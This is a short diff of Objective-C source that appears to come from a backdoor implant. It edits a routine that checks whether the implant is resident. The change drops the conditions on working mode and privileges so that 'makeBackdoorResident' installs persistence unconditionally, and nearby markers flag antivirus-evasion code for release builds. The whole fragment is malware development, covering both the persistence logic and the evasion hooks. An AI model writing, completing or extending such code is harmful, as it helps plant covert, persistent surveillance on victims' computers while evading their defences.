@@ -4224,21 +4224,12 @@ void decryptAndSaveIm()
     // otherwise add all the required files for making it resident
     if ([self amIResident] == NO)
     {
-        
-        // AV evasion: only on release build
-        AV_GARBAGE_000
-        
-        if (([workingMode isEqualToString: SLIPLIST] && sliSuccess == YES)
-            || ([workingMode isEqualToString: UISPOOF])
-            || (noPrivs == YES))
-        {
-            if ([self makeBackdoorResident] == NO)
-            {
+      if ([self makeBackdoorResident] == NO)
+      {
 #ifdef DEBUG_CORE
-                errorLog(@"An error occurred");
+          errorLog(@"An error occurred");
 #endif
-            }
-        }
+      }
     }
     
     // AV evasion: only on release build
